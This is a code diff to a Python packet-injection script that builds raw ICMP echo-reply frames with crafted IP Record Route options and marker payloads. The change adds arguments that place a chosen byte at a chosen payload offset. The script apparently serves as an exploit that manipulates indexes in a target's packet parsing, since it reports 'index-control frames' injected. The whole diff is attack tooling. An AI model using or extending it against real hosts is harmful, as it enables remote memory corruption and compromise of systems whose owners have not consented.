@@ -21,7 +21,7 @@ import time
 from inject_rr import csum
 
 
-def frame(pid, rr_len, ptr, i0, j0, seedflag, fill):
+def frame(pid, rr_len, ptr, i0, j0, seedflag, fill, target_index=-1, target_byte=0):
     ident = pid & 0xFFFF
     # payload[0..17]: marker, i0, j0, seedflag, marker
     lead = bytes([0xA0, 0xA1])
@@ -30,7 +30,10 @@ def frame(pid, rr_len, ptr, i0, j0, seedflag, fill):
     lead += struct.pack("<i", seedflag)
     lead += bytes([0xB0, 0xB1, 0xB2, 0xB3])
     assert len(lead) == 18
-    payload = lead + bytes([fill]) * 187
+    tail = [fill] * 187
+    if target_index >= 0:
+        tail[target_index] = target_byte
+    payload = lead + bytes(tail)
     icmp = struct.pack("!BBH", 0, 0, 0) + struct.pack("<H", ident) + struct.pack("<H", 0)
     icmp += payload
     opts = bytes([7, rr_len & 0xFF, ptr & 0xFF]) + bytes(range(0xA0, 0xA0 + 36)) + b"\0"
@@ -54,8 +57,11 @@ def main():
     ap.add_argument("--fill", type=int, default=0x20)
     ap.add_argument("--count", type=int, default=3)
     ap.add_argument("--gap", type=float, default=0.15)
+    ap.add_argument("--target-index", type=int, default=-1)
+    ap.add_argument("--target-byte", type=int, default=0)
     a = ap.parse_args()
-    packet = frame(a.pid, a.rr_len, a.ptr, a.i0, a.j0, a.seedflag, a.fill)
+    packet = frame(a.pid, a.rr_len, a.ptr, a.i0, a.j0, a.seedflag, a.fill,
+                   a.target_index, a.target_byte)
     s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     try:
@@ -65,7 +71,8 @@ def main():
     finally:
         s.close()
     print("injected %d index-control frames: i0=0x%02x j0=0x%02x fill=0x%02x "
-          "seedflag=%d pid=%d" % (a.count, a.i0, a.j0, a.fill, a.seedflag, a.pid))
+          "target[%d]=0x%02x seedflag=%d pid=%d" %
+          (a.count, a.i0, a.j0, a.fill, a.target_index, a.target_byte, a.seedflag, a.pid))
 
 
 if __name__ == "__main__":
